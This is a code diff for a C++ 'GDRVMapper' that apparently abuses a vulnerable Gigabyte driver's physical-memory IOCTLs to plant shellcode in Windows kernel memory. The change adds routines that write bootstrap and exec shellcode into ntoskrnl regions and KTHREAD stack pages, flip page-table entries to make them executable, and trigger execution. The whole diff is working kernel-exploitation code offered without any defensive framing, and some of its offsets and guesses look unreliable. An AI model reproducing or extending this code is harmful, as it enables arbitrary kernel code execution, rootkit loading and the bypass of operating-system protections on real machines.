@@ -102,15 +102,137 @@ bool GDRVMapper::WritePhysicalMemory(uint64_t physAddress, const void* buffer, s
     return false;
 }
 
+bool GDRVMapper::ExecuteBootstrapShellcode(uint64_t functionAddr, uint64_t* result) {
+    // Use a hardcoded guess at a good address that's likely writable (deep in ntoskrnl)
+    uint64_t scratchAddr = ntoskrnlBase + 0x200000; // Offset into ntoskrnl data region
+    
+    std::cout << "[*] Attempting bootstrap shellcode execution at 0x" << std::hex << scratchAddr << std::dec << std::endl;
+    
+    // Create minimal shellcode that just calls a function and returns the value
+    auto shellcode = ShellcodeUtils::CreateFastReturnShellcode(functionAddr);
+    
+    // Write the shellcode
+    if (!WritePhysicalMemory(scratchAddr, shellcode.data(), shellcode.size())) {
+        std::cerr << "[-] Failed to write bootstrap shellcode" << std::endl;
+        return false;
+    }
+    
+    // Make memory executable
+    if (!PageTableUtils::MakeMemoryExecutable(
+        scratchAddr,
+        [this](uint64_t addr, void* buf, size_t len) { return ReadPhysicalMemory(addr, buf, len); },
+        [this](uint64_t addr, const void* buf, size_t len) { return WritePhysicalMemory(addr, buf, len); },
+        nullptr  // Pass null to avoid recursion
+    )) {
+        std::cerr << "[-] Failed to make bootstrap shellcode executable" << std::endl;
+        return false;
+    }
+    
+    // Create exec shellcode
+    auto execShellcode = ShellcodeUtils::CreateExecShellcode(scratchAddr);
+    
+    // Need a second scratch address
+    uint64_t execAddr = scratchAddr + 0x1000;
+    
+    if (!WritePhysicalMemory(execAddr, execShellcode.data(), execShellcode.size())) {
+        std::cerr << "[-] Failed to write exec shellcode" << std::endl;
+        return false;
+    }
+    
+    if (!PageTableUtils::MakeMemoryExecutable(
+        execAddr,
+        [this](uint64_t addr, void* buf, size_t len) { return ReadPhysicalMemory(addr, buf, len); },
+        [this](uint64_t addr, const void* buf, size_t len) { return WritePhysicalMemory(addr, buf, len); },
+        nullptr  // Pass null to avoid recursion
+    )) {
+        std::cerr << "[-] Failed to make exec shellcode executable" << std::endl;
+        return false;
+    }
+    
+    // Execute directly through DeviceIoControl
+    GDRV_MEMORY_WRITE execRequest = { 0 };
+    execRequest.Address = execAddr;
+    execRequest.Length = sizeof(uint64_t);
+    execRequest.Buffer = (UINT64)result;
+    
+    DWORD bytesReturned = 0;
+    if (!DeviceIoControl(
+        hDevice,
+        GDRV_IOCTL_WRITE_MEMORY,
+        &execRequest,
+        sizeof(execRequest),
+        result,
+        sizeof(uint64_t),
+        &bytesReturned,
+        NULL
+    )) {
+        std::cerr << "[-] Failed to execute bootstrap shellcode (Error: " << GetLastError() << ")" << std::endl;
+        return false;
+    }
+    
+    std::cout << "[+] Bootstrap shellcode execution completed with result: 0x" << std::hex << *result << std::dec << std::endl;
+    return true;
+}
+
+uint64_t GDRVMapper::FindKThreadStackMemory() {
+    // Get PsGetCurrentThread address
+    HMODULE ntoskrnl = LoadLibraryA("ntoskrnl.exe");
+    if (!ntoskrnl) return 0;
+    
+    uint64_t getCurrentThreadRva = (uint64_t)GetProcAddress(ntoskrnl, "PsGetCurrentThread") - (uint64_t)ntoskrnl;
+    uint64_t psGetCurrentThreadAddr = ntoskrnlBase + getCurrentThreadRva;
+    FreeLibrary(ntoskrnl);
+    
+    if (!psGetCurrentThreadAddr) {
+        std::cerr << "[-] Failed to find PsGetCurrentThread" << std::endl;
+        return 0;
+    }
+    
+    std::cout << "[+] Found PsGetCurrentThread at 0x" << std::hex << psGetCurrentThreadAddr << std::dec << std::endl;
+    
+    // Execute bootstrap to get KTHREAD
+    uint64_t kthreadAddr = 0;
+    if (!ExecuteBootstrapShellcode(psGetCurrentThreadAddr, &kthreadAddr)) {
+        std::cerr << "[-] Failed to get KTHREAD address" << std::endl;
+        return 0;
+    }
+    
+    std::cout << "[+] Got KTHREAD at 0x" << std::hex << kthreadAddr << std::dec << std::endl;
+    
+    // Read stack base from KTHREAD
+    uint64_t stackBaseAddr = kthreadAddr + 0x28; // Stack base is at offset 0x28
+    uint64_t stackBase = 0;
+    
+    if (!ReadPhysicalMemory(stackBaseAddr, &stackBase, sizeof(stackBase))) {
+        std::cerr << "[-] Failed to read stack base" << std::endl;
+        return 0;
+    }
+    
+    std::cout << "[+] Stack base: 0x" << std::hex << stackBase << std::dec << std::endl;
+    
+    // Probe backward from stack base
+    for (int i = 2; i < 12; i++) { // Try several pages
+        uint64_t probeAddr = stackBase - (i * 0x1000);
+        
+        std::cout << "[*] Probing stack at 0x" << std::hex << probeAddr << std::dec << std::endl;
+        
+        // Try to write test pattern
+        std::vector<uint8_t> testPattern = { 0xDE, 0xAD, 0xBE, 0xEF };
+        if (WritePhysicalMemory(probeAddr, testPattern.data(), testPattern.size())) {
+            std::cout << "[+] Found writable stack memory at 0x" << std::hex << probeAddr << std::dec << std::endl;
+            return probeAddr;
+        }
+    }
+    
+    std::cerr << "[-] Failed to find writable stack memory" << std::endl;
+    return 0;
+}
+
 bool GDRVMapper::ExecuteKernelShellcode(const void* shellcode, size_t size, uint64_t* result) {
     std::cout << "[*] Attempting to execute shellcode..." << std::endl;
     
-    // Find writable data section for main shellcode
-    uint64_t shellcodeAddr = KernelMemory::FindWritableDataSection(
-        ntoskrnlBase,
-        [this](uint64_t addr, void* buf, size_t len) { return ReadPhysicalMemory(addr, buf, len); },
-        [this](uint64_t addr, const void* buf, size_t len) { return WritePhysicalMemory(addr, buf, len); }
-    );
+    // Use KTHREAD stack memory instead of data section search
+    uint64_t shellcodeAddr = FindKThreadStackMemory();
     
     if (!shellcodeAddr) {
         std::cerr << "[-] Failed to find memory for shellcode" << std::endl;
@@ -137,19 +259,9 @@ bool GDRVMapper::ExecuteKernelShellcode(const void* shellcode, size_t size, uint
     // Create shellcode to jump to our shellcode and store result
     auto jumpShellcode = ShellcodeUtils::CreateJumpShellcode(shellcodeAddr);
 
-    // Find writable data section for result
-    uint64_t resultAddr = KernelMemory::FindWritableDataSection(
-        ntoskrnlBase,
-        [this](uint64_t addr, void* buf, size_t len) { return ReadPhysicalMemory(addr, buf, len); },
-        [this](uint64_t addr, const void* buf, size_t len) { return WritePhysicalMemory(addr, buf, len); },
-        "ntoskrnl.exe"  // Skip ntoskrnl since we already used it
-    );
+    // Use next page in KTHREAD stack for result
+    uint64_t resultAddr = shellcodeAddr + 0x1000;
     
-    if (!resultAddr || resultAddr == shellcodeAddr) {
-        std::cerr << "[-] Failed to find memory for result" << std::endl;
-        return false;
-    }
-
     // Clear result memory
     uint64_t nullValue = 0;
     if (!WritePhysicalMemory(resultAddr, &nullValue, sizeof(nullValue))) {
@@ -160,18 +272,8 @@ bool GDRVMapper::ExecuteKernelShellcode(const void* shellcode, size_t size, uint
     // Execute the shellcode
     auto execShellcode = ShellcodeUtils::CreateExecShellcode(shellcodeAddr);
     
-    // Find another writable section for exec shellcode
-    uint64_t execAddr = KernelMemory::FindWritableDataSection(
-        ntoskrnlBase,
-        [this](uint64_t addr, void* buf, size_t len) { return ReadPhysicalMemory(addr, buf, len); },
-        [this](uint64_t addr, const void* buf, size_t len) { return WritePhysicalMemory(addr, buf, len); },
-        "ntoskrnl.exe"  // Skip ntoskrnl
-    );
-    
-    if (!execAddr || execAddr == shellcodeAddr || execAddr == resultAddr) {
-        std::cerr << "[-] Failed to find memory for exec shellcode" << std::endl;
-        return false;
-    }
+    // Use another page in KTHREAD stack for exec shellcode
+    uint64_t execAddr = shellcodeAddr + 0x2000;
 
     // Write and execute the exec shellcode
     if (!WritePhysicalMemory(execAddr, execShellcode.data(), execShellcode.size())) {
